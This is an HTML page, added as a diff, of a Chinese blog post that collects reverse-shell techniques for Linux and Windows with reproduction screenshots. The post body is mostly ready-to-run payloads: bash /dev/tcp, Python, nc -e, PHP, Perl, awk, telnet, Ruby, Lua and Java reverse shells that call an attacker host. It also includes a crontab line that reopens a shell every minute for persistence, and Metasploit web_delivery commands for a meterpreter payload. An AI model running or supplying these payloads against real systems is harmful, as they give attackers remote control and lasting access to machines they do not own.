@@ -1,0 +1,630 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#795548">
+  <meta name="description" content="">
+  <meta name="author" content="一叶枯舟">
+  <meta name="keywords" content="">
+  
+  <title>linux/windows反弹shell的利用方式和复现 - 一叶枯舟</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.9","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>一叶枯舟</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="linux/windows反弹shell的利用方式和复现">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2021-09-22 23:12" pubdate>
+        2021年9月22日 晚上
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      1.8k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      26
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">linux/windows反弹shell的利用方式和复现</h1>
+            
+            <div class="markdown-body">
+              <h1 id="linuxwindows反弹shell的利用方式和复现"><a class="markdownIt-Anchor" href="#linuxwindows反弹shell的利用方式和复现"></a> linux/windows反弹shell的利用方式和复现</h1>
+<h2 id="1linux反弹"><a class="markdownIt-Anchor" href="#1linux反弹"></a> 1.linux反弹</h2>
+<h3 id="11bash反弹"><a class="markdownIt-Anchor" href="#11bash反弹"></a> 1.1.Bash反弹</h3>
+<p>攻击机器命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>靶机命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bash -i &gt;&amp; /dev/tcp/攻击机ip/攻击机端口 0&gt;&amp;1<br></code></pre></td></tr></table></figure>
+<p>效果</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923170215201.png" srcset="/img/loading.gif" lazyload alt="image-20210923170215201" style="zoom:80%;">
+<h3 id="12python反弹"><a class="markdownIt-Anchor" href="#12python反弹"></a> 1.2.python反弹</h3>
+<p>攻击机器命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>靶机命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -c <span class="hljs-string">&quot;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#x27;攻击机ip&#x27;,攻击机端口));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&#x27;/bin/bash&#x27;,&#x27;-i&#x27;]);&quot;</span><br></code></pre></td></tr></table></figure>
+<p>效果</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923171211993.png" srcset="/img/loading.gif" lazyload alt="image-20210923171211993" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923171229676.png" srcset="/img/loading.gif" lazyload alt="image-20210923171229676" style="zoom:80%;">
+<h3 id="13nc反弹"><a class="markdownIt-Anchor" href="#13nc反弹"></a> 1.3.nc反弹</h3>
+<p><strong>需要靶机安装NC，且nc需要有-e参数（全功能版本）</strong>，自带版本可能不行需要上传或者安装带-e参数版本</p>
+<p>攻击机器命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>靶机命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e /bin/bash 攻击机ip 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>效果</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923172753686.png" srcset="/img/loading.gif" lazyload alt="image-20210923172753686" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923172814218.png" srcset="/img/loading.gif" lazyload alt="image-20210923172814218" style="zoom:80%;">
+<h3 id="14php反弹"><a class="markdownIt-Anchor" href="#14php反弹"></a> 1.4.php反弹</h3>
+<p>攻击机器命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>靶机命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">php -r <span class="hljs-string">&#x27;$sock=fsockopen(&quot;攻击机ip&quot;,攻击机端口);exec(&quot;/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span> <br></code></pre></td></tr></table></figure>
+<p>效果</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923213837682.png" srcset="/img/loading.gif" lazyload alt="image-20210923213837682" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210923213815351.png" srcset="/img/loading.gif" lazyload alt="image-20210923213815351" style="zoom:80%;">
+<h3 id="15perl反弹shell"><a class="markdownIt-Anchor" href="#15perl反弹shell"></a> <strong>1.5.perl反弹shell</strong></h3>
+<p>攻击机器命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>靶机命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">perl -e <span class="hljs-string">&#x27;use Socket;$i=&quot;攻击机ip&quot;;$p=攻击机端口;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/bash -i&quot;);&#125;;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>效果</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924100730572.png" srcset="/img/loading.gif" lazyload alt="image-20210924100730572" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924100705938.png" srcset="/img/loading.gif" lazyload alt="image-20210924100705938" style="zoom:80%;">
+<h3 id="16awk反弹shell"><a class="markdownIt-Anchor" href="#16awk反弹shell"></a> 1.6.awk反弹shell</h3>
+<p>攻击机器命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>靶机命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">awk <span class="hljs-string">&#x27;BEGIN&#123;s=&quot;/inet/tcp/0/攻击机ip/攻击机端口&quot;;for(;s|&amp;getline c;close(c))while(c|getline)print|&amp;s;close(s)&#125;&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>效果</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924103720891.png" srcset="/img/loading.gif" lazyload alt="image-20210924103720891" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924103830021.png" srcset="/img/loading.gif" lazyload alt="image-20210924103830021" style="zoom:80%;">
+<h3 id="17telnet反弹"><a class="markdownIt-Anchor" href="#17telnet反弹"></a> 1.7.telnet反弹</h3>
+<p>攻击机器命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br>nc -lvp 攻击机端口2<br>//在攻击机端口执行的命令会回显在攻击机端口2<br></code></pre></td></tr></table></figure>
+<p>靶机命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 攻击机ip 攻击机端口 | /bin/bash | telnet 攻击机ip 攻击机端口2<br></code></pre></td></tr></table></figure>
+<p>效果</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924110120485.png" srcset="/img/loading.gif" lazyload alt="image-20210924110120485" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924110205052.png" srcset="/img/loading.gif" lazyload alt="image-20210924110205052" style="zoom:70%;">
+<h3 id="18crontab定时任务python反弹"><a class="markdownIt-Anchor" href="#18crontab定时任务python反弹"></a> 1.8.crontab定时任务+python反弹</h3>
+<p>攻击机器命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvp 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>靶机命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">(crontab -l;<span class="hljs-built_in">printf</span> <span class="hljs-string">&quot;* * * * *  /usr/bin/python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;攻击机ip\&quot;,攻击机端口));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;,\&quot;-i\&quot;]);&#x27;\n&quot;</span>)|crontab -	<br></code></pre></td></tr></table></figure>
+<p>效果</p>
+<p><img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924111618351.png" srcset="/img/loading.gif" lazyload alt="image-20210924111618351"></p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924111653163.png" srcset="/img/loading.gif" lazyload alt="image-20210924111653163" style="zoom:80%;">
+<h3 id="19java反弹shell"><a class="markdownIt-Anchor" href="#19java反弹shell"></a> 1.9.java反弹shell</h3>
+<p><strong>可能需要先编译类文件，实际我操作直接使用java命令也可</strong></p>
+<p>java代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@param</span> args</span><br><span class="hljs-comment">    * <span class="hljs-doctag">@throws</span> Exception </span><br><span class="hljs-comment">    */</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        <span class="hljs-comment">// TODO Auto-generated method stub</span><br>        Runtime r = Runtime.getRuntime();<br>        String cmd[]= &#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;exec 5&lt;&gt;/dev/tcp/攻击机ip/攻击机端口;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done&quot;</span>&#125;;<br>        Process p = r.exec(cmd);<br>        p.waitFor();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>
+<p>靶机操作</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">touch 1.java<br>vim 1.java  //wq退出保存<br><span class="hljs-comment">##javac 1.java</span><br><span class="hljs-comment">##java 1</span><br><span class="hljs-comment">##或直接使用 java 1.java</span><br></code></pre></td></tr></table></figure>
+<p>攻击机操作：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>效果：</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924141706817.png" srcset="/img/loading.gif" lazyload alt="image-20210924141706817" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924142110086.png" srcset="/img/loading.gif" lazyload alt="image-20210924142110086" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924142420044.png" srcset="/img/loading.gif" lazyload alt="image-20210924142420044" style="zoom:80%;">
+<h3 id="110ruby反弹shell"><a class="markdownIt-Anchor" href="#110ruby反弹shell"></a> 1.10.Ruby反弹shell</h3>
+<p>靶机命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ruby -rsocket -e <span class="hljs-string">&#x27;exit if fork;c=TCPSocket.new(&quot;攻击机ip&quot;,&quot;攻击机端口&quot;);while(cmd=c.gets);IO.popen(cmd,&quot;r&quot;)&#123;|io|c.print io.read&#125;end&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>攻击机命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>效果</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924142921750.png" srcset="/img/loading.gif" lazyload alt="image-20210924142921750" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924143012492.png" srcset="/img/loading.gif" lazyload alt="image-20210924143012492" style="zoom:80%;">
+<h3 id="111rua反弹shell未复现"><a class="markdownIt-Anchor" href="#111rua反弹shell未复现"></a> 1.11.rua反弹shell（未复现）</h3>
+<p><strong>环境需要：</strong></p>
+<p>1.lua命令安装</p>
+<p>2.默认 FS 的 mod_lua 中没有对socket 的支持，想通过Lua 脚本实现 http，需要添加 socket的支持。</p>
+<p>解决方法：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/logo-fox/p/5040908.html">luasocket 安装记录 （FS1.6） - 丹江流 - 博客园 (cnblogs.com)</a></p>
+<p><strong>但是我无法下载那个 luasocket-2.0.2</strong></p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924144856249.png" srcset="/img/loading.gif" lazyload alt="image-20210924144856249" style="zoom:80%;">
+<p>靶机命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lua -e <span class="hljs-string">&quot;require(&#x27;socket&#x27;);require(&#x27;os&#x27;);t=socket.tcp();t:connect(&#x27;攻击机ip&#x27;,&#x27;攻击机端口&#x27;);os.execute(&#x27;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#x27;);&quot;</span><br></code></pre></td></tr></table></figure>
+<p>攻击机命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 攻击机端口<br></code></pre></td></tr></table></figure>
+<h2 id="2windows反弹shell"><a class="markdownIt-Anchor" href="#2windows反弹shell"></a> 2.Windows反弹shell</h2>
+<h3 id="21-nc反弹"><a class="markdownIt-Anchor" href="#21-nc反弹"></a> 2.1 nc反弹</h3>
+<p><strong>需要把nc上传被控端，或者被控端自带nc</strong></p>
+<p><strong>nc正向shell</strong>：</p>
+<p>靶机命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 靶机端口 -e cmd.exe<br></code></pre></td></tr></table></figure>
+<p>攻击机命令：</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">nc</span> 靶机<span class="hljs-built_in">ip</span> 靶机端口<br></code></pre></td></tr></table></figure>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924151035750.png" srcset="/img/loading.gif" lazyload alt="image-20210924151035750" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924151207188.png" srcset="/img/loading.gif" lazyload alt="image-20210924151207188" style="zoom:80%;">
+<p><strong>nc反向shell：</strong></p>
+<p>靶机命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -e cmd.exe 攻击机ip 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>攻击机命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -lvvp 攻击机端口<br></code></pre></td></tr></table></figure>
+<p>这里测试了powershell.exe</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924152312718.png" srcset="/img/loading.gif" lazyload alt="image-20210924152312718" style="zoom:80%;">
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924152246153.png" srcset="/img/loading.gif" lazyload alt="image-20210924152246153" style="zoom:80%;">
+<h3 id="22-regsvr32-反弹shell没复现成功"><a class="markdownIt-Anchor" href="#22-regsvr32-反弹shell没复现成功"></a> <strong>2.2 Regsvr32 反弹shell</strong>（没复现成功）</h3>
+<p><strong>介绍：</strong></p>
+<p>Regsvr32.exe是一个命令行应用程序，用于注册和注销OLE控件，如Windows注册表中的dll和ActiveX控件。</p>
+<p>Regsvr32.exe安装在Windows XP和Windows后续版本的 %systemroot%\System32 文件夹中。</p>
+<p><strong>语法:</strong></p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">Regsvr32 [<span class="hljs-string">/s</span>] [<span class="hljs-string">/u</span>] [<span class="hljs-string">/n</span>][<span class="hljs-string">/i</span>[<span class="hljs-function">:cmdline</span>]] &lt;dllname&gt;<br><span class="hljs-string">/u</span> - 注销服务器<br><span class="hljs-string">/i</span> - 调用DllInstall传递一个可选的[cmdline];当它与<span class="hljs-string">/u</span>一起使用时，它调用dll来卸载<br><span class="hljs-string">/n</span> - 不要调用DllRegisterServer; 此选项必须与<span class="hljs-string">/i</span>一起使用<br><span class="hljs-string">/s</span> - 沉默; 不显示消息框`<br></code></pre></td></tr></table></figure>
+<p>使用:msf使用 web_delivery 模块</p>
+<p>根据options进行设置</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924155945422.png" srcset="/img/loading.gif" lazyload alt="image-20210924155945422" style="zoom:80%;">
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">use exploit/multi/script/web_delivery<br>msf exploit (web_delivery)&gt; <span class="hljs-built_in">set</span> srvhost 攻击机ip<br>msf exploit (web_delivery)&gt; <span class="hljs-built_in">set</span> target 3<br>msf exploit (web_delivery)&gt; <span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br>msf exploit (web_delivery)&gt; <span class="hljs-built_in">set</span> lhost 攻击机ip<br>msf exploit (web_delivery)&gt; exploit -j<br></code></pre></td></tr></table></figure>
+<p>随后生成一个命令</p>
+<img src="/2021/09/22/linux-windows%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F%E5%92%8C%E5%A4%8D%E7%8E%B0/image-20210924160240678.png" srcset="/img/loading.gif" lazyload alt="image-20210924160240678" style="zoom:80%;">
+<p>在靶机上使用即可，命令形式**（会被杀软杀）**</p>
